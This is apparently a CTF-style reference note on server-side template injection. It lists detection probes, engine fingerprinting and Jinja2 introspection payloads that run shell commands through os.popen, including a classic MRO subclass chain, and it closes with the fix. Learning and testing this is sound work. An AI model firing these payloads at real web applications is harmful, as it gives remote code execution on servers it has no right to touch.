---
type: reference
category: Payloads
tags: [reference, payloads, web, ssti]
---

# SSTI (Server-Side Template Injection)

SSTI happens when user input is concatenated into a template string instead of passed as a context variable. Vulnerable pattern: `render_template_string("... " + user_input)`. Backed by [[SSTI1]].

## Detect

```
{{7*7}}            -> 49 means the expression is evaluated server-side
${7*7}             -> alt syntax (some engines)
<%= 7*7 %>         -> alt syntax (ERB/others)
```

## Fingerprint the engine

```
{{7*'7'}}          -> 7777777 = Jinja2/Python  |  49 = Twig/PHP
```
The behavior forks cleanly between Python and PHP engines, which decides your whole exploit chain.

## Recon (Jinja2)

```
{{ config }}
{{ config.items() }}
{{ self.__init__.__globals__ }}
```

## RCE payloads (Jinja2) — swap the command in popen()

```
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('ls').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
```

If `cycler` is filtered, `lipsum` and `request.application...` are drop-in alternatives on the same app.

## Classic MRO chain (when shortcuts are filtered)

```
{{ ''.__class__.__mro__[1].__subclasses__() }}
# find subprocess.Popen's index in the list, then call it to run commands
```

## Read the flag

```
{{ lipsum.__globals__.os.popen('cat flag').read() }}
```

## Notes
- Once in a Jinja2 context, almost any object (`cycler`, `lipsum`, `request`, `config`, `self`) is a doorway to `__globals__` and then `os`. You're walking Python's introspection graph back to code execution.
- Fix: render a static template and pass user input as data: `render_template_string("{{ msg }}", msg=user_input)`.

## Related
- [[Web App Methodology]], [[SSTI1]]
